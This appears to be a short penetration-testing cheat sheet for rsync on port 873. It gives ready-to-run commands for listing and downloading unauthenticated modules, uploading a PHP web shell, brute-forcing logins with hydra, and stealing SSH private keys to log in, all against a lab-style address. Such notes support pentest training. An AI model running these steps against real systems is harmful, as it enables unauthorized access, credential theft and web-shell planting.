# Rsync (873)

!!! tip "Start here"
    List modules anonymously: `rsync -av --list-only rsync://10.10.10.10`. If modules appear, pull them without credentials: `rsync -av rsync://10.10.10.10/<module> ./`. Look for SSH keys, config backups, and database dumps in what comes back.

---

## Enumeration

```bash
nmap -p 873 --script rsync-list-modules 10.10.10.10
rsync -av --list-only rsync://10.10.10.10
```

---

## Download Files

```bash
# Entire module
rsync -av rsync://10.10.10.10/<module> ./loot/

# Single file
rsync -av rsync://10.10.10.10/<module>/path/to/file.txt ./
```

---

## Upload Files

If the module is writable:

```bash
rsync -av ./shell.php rsync://10.10.10.10/<module>/path/
```

---

## Brute Force

```bash
hydra -L users.txt -P passwords.txt rsync://10.10.10.10
```

---

## SSH Key Theft

If home directories are exposed:

```bash
rsync -av rsync://10.10.10.10/<module>/home/user/.ssh/id_rsa ./
chmod 600 id_rsa
ssh -i id_rsa user@10.10.10.10
```

!!! tip "Real-world"
    Rsync without authentication is a misconfiguration that mostly shows up on backup servers and internal infrastructure. Modules that expose `/home`, `/etc`, or application directories are high-value — pull everything and grep offline. Write access to a web-accessible path is a direct shell upload.
